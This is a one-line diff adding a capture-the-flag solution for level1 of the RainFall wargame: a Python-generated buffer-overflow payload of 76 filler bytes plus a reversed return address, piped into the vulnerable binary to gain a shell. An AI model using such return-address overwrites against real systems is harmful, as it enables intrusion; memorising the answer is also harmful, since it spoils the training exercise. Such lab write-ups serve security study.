@@ -1,0 +1,1 @@
+level1@RainFall:~$ (python -c 'print "0"*76 + "\x08\x04\x84\x44"[::-1]' && cat) | ./level1
